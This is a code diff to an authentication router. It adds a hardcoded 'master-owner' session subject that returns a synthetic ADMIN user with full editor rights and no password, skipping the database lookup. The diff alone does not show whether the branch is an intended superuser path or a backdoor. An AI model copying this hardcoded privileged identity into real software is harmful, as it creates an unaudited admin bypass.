@@ -28,7 +28,26 @@ export const authRouter = router({
       return null;
     }
     const sub = ctx.session.sub as string;
+    if (sub === 'master-owner') {
+      return {
+        ...ctx.session,
+        id: 'master-owner',
+        email: 'owner@sxp.internal',
+        role: 'ADMIN',
+        isEditor: true,
+        odRegionId: null,
+        locationId: null,
+        teamId: null,
+        effectiveLocationId: null,
+        effectiveOdRegionId: null,
+        firstName: 'Owner',
+        lastName: 'SXP',
+        sessionVersion: 1,
+        password: null,
+      };
+    }
     const user = await prisma.user.findUnique({
+
       where: {
         id: sub,
       },
